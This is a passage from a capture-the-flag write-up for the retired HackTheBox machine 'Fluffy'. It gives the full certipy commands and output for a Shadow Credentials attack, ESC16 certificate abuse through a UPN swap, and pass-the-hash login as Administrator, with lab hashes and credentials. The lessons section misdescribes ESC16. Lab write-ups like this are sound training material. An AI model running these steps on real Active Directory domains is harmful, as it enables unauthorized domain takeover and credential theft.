## 🪪 ADCS ECS16

### 🔎 Recon

I ran `certipy-ad find`, but could not find any ESCs.

But then BloodHound showed that `p.agila` could also perform a Shadow Credentials attack on the `ca_svc` service account.  This account name suggests that the account is the Certificate Authority account.

![](images/Pasted%20image%2020250716070208.png)

`certipy-ad` was once again used to perform a Shadow Credentials attack on the `ca_svc` service account using the user `p.agila`.

```
fcoomans@kali:~/htb/fluffy$ certipy-ad shadow -u p.agila -p prometheusx-303 -dc-ip 10.10.11.69 -account ca_svc auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'cfedad4b-ab55-72da-4ff3-dff10f1e8b95'
[*] Adding Key Credential with device ID 'cfedad4b-ab55-72da-4ff3-dff10f1e8b95' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'cfedad4b-ab55-72da-4ff3-dff10f1e8b95' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

`nxc` confirmed that the hash was valid.

```
fcoomans@kali:~/htb/fluffy$ nxc smb dc01.fluffy.htb -u ca_svc -H ca0f4f9e9eb8a092addf53bb03fc98c8
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8
```

`certipy-ad find` was run again, but this time as the `ca_svc` service account to find ADCS vulnerabilities.

```
fcoomans@kali:~/htb/fluffy$ certipy-ad find -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ns 10.10.11.69 -dc-ip dc01.fluffy.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250716135234_Certipy.txt'
[*] Wrote text output to '20250716135234_Certipy.txt'
[*] Saving JSON output to '20250716135234_Certipy.json'
[*] Wrote JSON output to '20250716135234_Certipy.json'
```

Looking at the generated logs revealed that the ADCS was vulnerable to **ESC16**.

```
fcoomans@kali:~/htb/fluffy$ cat 20250716135234_Certipy.txt
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.

<SNIP>
```

BloodHound also confirmed that the `ca_svc` service account was responsible for publishing certificates, through it's membership to the `CERT PUBLISHERS` group.

![](images/Pasted%20image%2020250716082855.png)

### 🧪 Exploitation

The `certipy-ad` wiki shows the exact steps needed to perform the ESC16 vulnerability exploit.
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally

I once again used `p.agila` to perform the ESC16 attack using `ca_svc` to escalate privileges.

![](images/Pasted%20image%2020250716073659.png)

An automated script on the server removed `p.agila` from the `SERVICE ACCOUNTS` group.  So, I re-added the user to the group and proceeded with the steps from the wiki.

```
fcoomans@kali:~/htb/fluffy$ net rpc group members "SERVICE ACCOUNTS" -U "FLUFFY/p.agila%prometheusx-303" -S "dc01.fluffy.htb"
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\winrm_svc

fcoomans@kali:~/htb/fluffy$ net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY/p.agila%prometheusx-303" -S "dc01.fluffy.htb"

fcoomans@kali:~/htb/fluffy$ net rpc group members "SERVICE ACCOUNTS" -U "FLUFFY/p.agila%prometheusx-303" -S "dc01.fluffy.htb"
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

**Step 1: Read initial UPN of the victim account (Optional - for restoration).**

```
fcoomans@kali:~/htb/fluffy$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-07-16T12:57:03+00:00
```

**Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.**

```
fcoomans@kali:~/htb/fluffy$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'

fcoomans@kali:~/htb/fluffy$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-07-16T13:11:16+00:00
```

**Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**

```
fcoomans@kali:~/htb/fluffy$ certipy-ad shadow -u p.agila -p prometheusx-303 -dc-ip 10.10.11.69 -account ca_svc auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3aef2508-f2d0-4612-e11b-509c1faaab00'
[*] Adding Key Credential with device ID '3aef2508-f2d0-4612-e11b-509c1faaab00' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '3aef2508-f2d0-4612-e11b-509c1faaab00' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8

fcoomans@kali:~/htb/fluffy$ export KRB5CCNAME=ca_svc.ccache

fcoomans@kali:~/htb/fluffy$ klist
Ticket cache: FILE:ca_svc.ccache
Default principal: ca_svc@FLUFFY.HTB

Valid starting       Expires              Service principal
07/16/2025 15:16:56  07/17/2025 01:16:56  krbtgt/FLUFFY.HTB@FLUFFY.HTB
        renew until 07/17/2025 15:16:28
```

**Step 4: Request a certificate as the "victim" user from _any suitable client authentication template_ (e.g., "User") on the ESC16-vulnerable CA.**

```
fcoomans@kali:~/htb/fluffy$ certipy-ad req -k -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Step 5: Revert the "victim" account's UPN.**

```
fcoomans@kali:~/htb/fluffy$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

**Step 6: Authenticate as the target administrator.**

```
fcoomans@kali:~/htb/fluffy$ certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

`nxc` confirmed that the `Administrator` NTLM hash was valid.

```
fcoomans@kali:~/htb/fluffy$ nxc smb dc01.fluffy.htb -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\Administrator:8da83a3fa618b6e3a00e93f676c92a6e (Pwn3d!)
```

`evil-winrm` was used to connect to the server as the `Administrator` user.

```
fcoomans@kali:~/htb/fluffy$ evil-winrm -i dc01.fluffy.htb -u 'administrator@fluffy.htb' -H '8da83a3fa618b6e3a00e93f676c92a6e'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
```

### 💰 Post Exploitation

#### 🏆 root.txt

The Administrator user holds the `root.txt` flag.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
d27cc7823bc05cda72cb4d8b4f5cccc5
```

Remember: what’s shared on the file server doesn’t stay on the file server. 📂

And `Fluffy has been Pwned!` 🎉

![](images/Pasted%20image%2020250716102254.png)

## 📚 Lessons Learned

- **File Shares Must be Controlled and Monitored**: Shared file servers need regular reviews to ensure that sensitive documents are either encrypted, access-controlled, or not stored there at all.
- **Principle of Least Privilege (PoLP)**: Users should only have the minimal rights needed for their role. In this case, excessive ACE (Access Control Entries) allowed privilege escalation.
- **ADCS ESC16 – Certificate Authority Abuse**: ESC16 is a misconfiguration where the Certificate Authority’s template allows overly broad enrollment or dangerous flag settings. This enables attackers to request certificates that can be used for **domain compromise**.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.

